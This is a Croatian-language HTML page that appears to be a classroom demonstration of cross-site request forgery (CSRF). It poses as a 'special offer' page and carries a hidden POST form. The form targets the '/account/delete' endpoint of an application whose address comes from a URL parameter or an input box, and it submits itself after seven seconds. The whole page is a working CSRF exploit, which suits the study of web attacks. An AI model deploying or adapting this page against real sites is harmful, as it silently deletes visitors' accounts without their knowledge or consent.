<!doctype html>
<html lang="hr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Posebna ponuda</title>

    <style>
      body {
        margin: 0;
        padding: 30px;
        font-family: Arial, sans-serif;
        background: #f5f5f5;
        color: #222;
      }

      main {
        max-width: 450px;
        margin: 80px auto;
        padding: 25px;
        background: white;
        border: 1px solid #ddd;
      }

      h1 {
        font-size: 24px;
      }

      p {
        line-height: 1.5;
      }

      .status {
        margin: 20px 0;
        padding: 12px;
        background: #eee;
      }

      button {
        padding: 10px 16px;
        border: none;
        background: #444;
        color: white;
        cursor: pointer;
      }

      button:hover {
        background: #222;
      }

      #targetForm {
        display: none;
        margin-top: 15px;
      }

      input {
        width: 100%;
        padding: 10px;
        margin: 8px 0 12px;
        box-sizing: border-box;
      }

      .error {
        color: red;
      }
    </style>
  </head>

  <body>
    <main>
      <h1>Preuzmi svoju posebnu ponudu!</h1>

      <div id="status" class="status" role="status">Priprema zahtjeva…</div>

      <!-- post forma za napad -->
      <form id="attackForm" method="POST">
        <input type="hidden" name="source" value="external-attacker-page" />
        <button type="submit" id="sendButton">Pošalji zahtjev</button>
      </form>

      <!-- ako nedostaje adresa -->
      <form id="targetForm">
        <label for="targetInput"> Adresa demonstracijske aplikacije </label>

        <input
          id="targetInput"
          type="url"
          placeholder="https://moja-aplikacija.onrender.com"
          required
        />

        <button type="submit">Postavi adresu</button>
      </form>
    </main>

    <script>
      const params = new URLSearchParams(window.location.search);
      const statusBox = document.getElementById("status");
      const form = document.getElementById("attackForm");
      const targetForm = document.getElementById("targetForm");
      const targetInput = document.getElementById("targetInput");
      const sendButton = document.getElementById("sendButton");

      function startAttack(value) {
        let target;

        try {
          target = new URL(value);
        } catch {
          statusBox.textContent = "Adresa aplikacije nije valjana.";
          statusBox.classList.add("error");
          return;
        }

        if (target.protocol !== "http:" && target.protocol !== "https:") {
          statusBox.textContent = "Dopuštene su samo HTTP i HTTPS adrese.";
          statusBox.classList.add("error");
          return;
        }

        // ruza za brisanje racuna aplikacije
        form.action = new URL("/account/delete", target.origin).toString();

        statusBox.textContent =
          "Lažni POST zahtjev za brisanje računa bit će poslan za 7 sekundi…";

        sendButton.hidden = false;

        // automatski posalji zahtjev nakon 7 sekundi
        window.setTimeout(() => {
          if (form.isConnected) form.requestSubmit();
        }, 7000);
      }

      const target = params.get("target");

      if (target) {
        startAttack(target);
      } else {
        statusBox.textContent =
          "Nedostaje adresa ciljne aplikacije. Unesi je za nastavak.";

        targetForm.style.display = "block";
        form.style.display = "none";
      }

      targetForm.addEventListener("submit", (event) => {
        event.preventDefault();

        form.style.display = "block";
        targetForm.style.display = "none";

        startAttack(targetInput.value);
      });
    </script>
  </body>
</html>
